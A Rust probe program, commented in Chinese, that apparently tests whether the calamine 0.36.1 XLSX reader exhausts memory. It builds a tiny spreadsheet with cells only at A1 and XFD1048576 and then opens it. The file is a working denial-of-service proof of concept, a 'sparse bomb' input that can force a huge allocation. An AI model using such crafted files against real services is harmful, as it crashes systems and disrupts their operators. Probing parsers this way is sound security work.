//! r4-t2 探针：稀疏包围盒炸弹（XLSX 读面语义层）。
//!
//! 假设链：calamine 0.36.1 `Range::from_sparse`（lib.rs:949-976）按
//! 实际单元格的**包围盒稠密化**——`vec![T::default(); cols × rows]`。
//! 两个相距最远的格（A1 + XFD1048576）→ 16384 × 1048576 =
//! 17,179,869,184 格 × sizeof(Data)（≈32B）≈ **550GB 分配** → 进程
//! abort（alloc failure）或 OOM kill。输入文件 < 1KB。
//!
//! 用法：`cargo run --release --bin sparse_bomb [--ulimit 包裹]`
//! 退出形态即证据：0 = 正常读回（假设否）；abort/OOM = 假设成立。

use std::io::Write as _;

fn build_sparse_bomb(path: &str) {
    let sheet = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>a</t></is></c></row><row r="1048576"><c r="XFD1048576" t="inlineStr"><is><t>b</t></is></c></row></sheetData></worksheet>"#;
    let entries: Vec<(&str, &[u8])> = vec![
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>"#,
        ),
        (
            "_rels/.rels",
            br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>"#,
        ),
        (
            "xl/workbook.xml",
            br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="S1" sheetId="1" r:id="rId1"/></sheets></workbook>"#,
        ),
        (
            "xl/_rels/workbook.xml.rels",
            br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>"#,
        ),
        ("xl/worksheets/sheet1.xml", sheet),
    ];
    let f = std::io::BufWriter::new(std::fs::File::create(path).unwrap());
    let mut zw = zip::ZipWriter::new(f);
    let opts: zip::write::SimpleFileOptions = Default::default();
    for (name, data) in entries {
        zw.start_file(name, opts).unwrap();
        zw.write_all(data).unwrap();
    }
    zw.finish().unwrap();
}

fn main() {
    let path = std::env::temp_dir().join(format!("sparse_bomb_{}.xlsx", std::process::id()));
    let path = path.to_str().unwrap();
    build_sparse_bomb(path);
    let meta = std::fs::metadata(path).unwrap();
    println!("bomb file: {path} ({} bytes)", meta.len());
    println!("opening with calamine 0.36.1 (worksheet_range = from_sparse dense grid)...");
    let mut book: calamine::Xlsx<_> =
        calamine::open_workbook(path).expect("open (EOCD fine — the file is a valid tiny zip)");
    println!("extracting S1 ...");
    use calamine::Reader as _;
    let range = book.worksheet_range("S1").expect("range");
    println!(
        "SURVIVED: range {}x{} (start {:?} end {:?}) — hypothesis REFUTED",
        range.width(),
        range.height(),
        range.start(),
        range.end()
    );
    let _ = std::fs::remove_file(path);
}
